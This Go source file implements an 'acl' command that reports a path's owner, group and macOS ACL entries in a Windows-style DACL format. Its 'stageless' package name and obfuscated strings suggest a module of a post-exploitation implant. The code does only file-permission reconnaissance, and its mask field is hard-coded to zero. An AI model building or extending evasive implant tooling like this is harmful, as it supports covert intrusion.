package capabilities

import (
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"syscall"

	"stageless/utils/obf"
)

func RunAcl(args string) []byte {
	// Main function that prints access control for a path
	path := strings.TrimSpace(args)
	if path == "" {
		return WriteMsg(obf.S("Error: missing path"))
	}
	info, err := os.Lstat(path)
	if err != nil {
		return WriteMsg(obf.S("Error: path not found"))
	}
	st, ok := info.Sys().(*syscall.Stat_t)
	if !ok {
		return WriteMsg(obf.S("Error: path not found"))
	}
	owner := fmt.Sprintf("%d", st.Uid)
	if u, err := user.LookupId(owner); err == nil {
		owner = u.Username
	}
	group := fmt.Sprintf("%d", st.Gid)
	if g, err := user.LookupGroupId(group); err == nil {
		group = g.Name
	}
	var b strings.Builder
	b.WriteString(obf.S("path: "))
	b.WriteString(path)
	b.WriteByte('\n')
	b.WriteString(obf.S("owner: "))
	b.WriteString(owner)
	b.WriteByte('\n')
	b.WriteString(obf.S("group: "))
	b.WriteString(group)
	b.WriteByte('\n')
	out, err := exec.Command("/bin/ls", "-le", path).Output()
	if err != nil {
		b.WriteString(obf.S("dacl: (none)\n"))
		return WriteMsg(b.String())
	}
	lines := strings.Split(string(out), "\n")
	var aclLines []string
	for i := 1; i < len(lines); i++ {
		line := lines[i]
		if len(line) == 0 {
			continue
		}
		if line[0] == ' ' || (line[0] >= '0' && line[0] <= '9') {
			aclLines = append(aclLines, line)
		}
	}
	if len(aclLines) == 0 {
		b.WriteString(obf.S("dacl: (none)\n"))
		return WriteMsg(b.String())
	}
	b.WriteString(obf.S("dacl:\n"))
	for _, line := range aclLines {
		line = strings.TrimSpace(line)
		label := obf.S("ALLOW")
		if strings.Contains(strings.ToLower(line), obf.S("deny")) {
			label = obf.S("DENY")
		}
		sid := line
		if idx := strings.Index(line, ":"); idx >= 0 {
			sid = strings.TrimSpace(line[idx+1:])
		}
		b.WriteString(fmt.Sprintf("  [%s] mask=0x%08x sid=%s\n", label, uint32(0), sid))
	}
	return WriteMsg(b.String())
}
